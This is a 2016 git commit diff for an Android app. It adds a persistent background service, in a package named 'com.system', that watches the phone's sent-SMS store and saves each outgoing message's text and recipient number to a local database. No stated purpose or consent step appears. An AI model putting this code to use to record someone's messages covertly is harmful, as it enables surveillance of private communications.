77bd495f2e910c4f4404047516a39338850f1026
Shahnawaz Ali <shahnawazali.symits@gmail.com>
2016-05-06 18:12:16 +0500

    First Commit

--- app/src/main/java/com/system/OutService.java
+++ app/src/main/java/com/system/OutService.java
@@ -3,6 +3,8 @@ package com.system;
 import android.app.Service;
 import android.content.Intent;
 import android.database.ContentObserver;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
@@ -19,14 +21,30 @@ public class OutService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        getApplicationContext().getContentResolver().registerContentObserver();
+        Uri uriSMSURI = Uri.parse("content://sms/sent");
+        getApplicationContext().getContentResolver().registerContentObserver(uriSMSURI, false, new MyObserver(new Handler()));
         return START_STICKY;
     }
 
-    public static class MyObserver extends ContentObserver {
+    public class MyObserver extends ContentObserver {
 
         public MyObserver(Handler handler) {
             super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            Uri uriSMSURI = Uri.parse("content://sms/sent");
+            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+            if (cur != null && cur.moveToNext()) {
+                String content = cur.getString(cur.getColumnIndex("body"));
+                String smsNumber = cur.getString(cur.getColumnIndex("address"));
+                cur.close();
+
+                new DataBase(getApplicationContext()).insertMessage(content, smsNumber, false);
+            }
+
         }
     }
 }
